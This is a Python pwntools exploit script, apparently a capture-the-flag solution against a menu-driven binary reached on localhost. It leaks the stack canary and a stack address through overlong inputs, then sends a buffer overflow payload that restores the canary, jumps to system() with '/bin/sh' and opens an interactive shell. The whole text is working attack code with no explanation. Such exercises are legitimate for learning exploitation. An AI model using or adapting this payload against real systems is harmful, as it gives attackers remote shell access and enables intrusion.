from pwn import *
import sys

r = remote('localhost',int(sys.argv[1]))

def SelectMenu(contents):
    msg = r.recvuntil("Select menu >")
    print contents
    r.sendline(contents)
def InputMessage(contents):
    msg = r.recvuntil("Input Your Message :")
    print contents
    r.send(contents) 
    if contents == 'a'*41 :
        r.recvuntil(contents)
        leak = r.recv(3)
        return '\x00'+ leak 
    elif contents == 'a'*64 :
        r.recvuntil(contents)
        leak = r.recv(4)
        return leak
######### canary leak ############
SelectMenu('1')
canary = u32(InputMessage('a'*41))
r.info(hex(canary))
#####################################
SelectMenu('1')
stackmost = u32(InputMessage('a'*64))
r.info(hex(stackmost))
#####################################
system = 0x8048620
binsh = 0xf7f660cf - 0xf7de8000
SelectMenu('1')
pay = "c"*40 + p32(canary)+'\x00'*12 + p32(system) +"\x00"*4+p32(stackmost) +"\x00"*12 +"/bin/sh"
#####################################
InputMessage(pay)
r.interactive()

